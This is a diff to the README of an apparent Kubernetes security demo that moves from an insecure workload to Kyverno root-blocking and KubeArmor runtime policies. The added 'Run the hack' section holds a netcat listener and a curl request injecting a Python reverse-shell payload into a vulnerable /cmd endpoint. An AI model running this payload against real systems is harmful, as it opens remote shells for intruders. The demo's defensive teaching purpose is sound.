@@ -48,23 +48,47 @@ Each directory in \`manifests/\` shows a different security stage:
 
 ---
 
-## Quickstart
+## Quickstart (the slides show all the scenarios but this might be helpful)
 
+### Deploy Vulnerable Workload and Service
 \`\`\`bash
 kubectl apply -f manifests/insecure.yaml
-# Start testing reverse shell
 \`\`\`
 
-For full prevention, try:
+### Run the hack
+Listener in one terminal assuming Mac:
+\`\`\`bash
+nc -l 4444
+\`\`\`
+
+RCE in other terminal:
+\`\`\`bash
+curl "http://\"app_ip_address\":30080/cmd" \
+  --get \
+  --data-urlencode 'input=python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"host_ip_address\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")"'
+\`\`\`
+
+### For full root block:
 \`\`\`bash
 kubectl apply -f manifests/kyverno-block-root.yaml
-# Then re-apply insecure.yaml and see it get blocked
 \`\`\`
 
-To simulate runtime enforcement:
+### Deploy Non Root workload:
+\`\`\`bash
+kubectl apply -f manifests/secure.yaml
+\`\`\`
+
+### Create runtime enforcement policy:
 \`\`\`bash
 kubectl apply -f manifests/kubearmor-mailroom-locks.yaml
 \`\`\`
+
+### Test runtime enforcement policy:
+\`\`\`bash
+kubectl apply -f manifests/secure.yaml
+\`\`\`
+
+### Reuse RCE and try to start Python listener or write to tmp
 
 ---
 
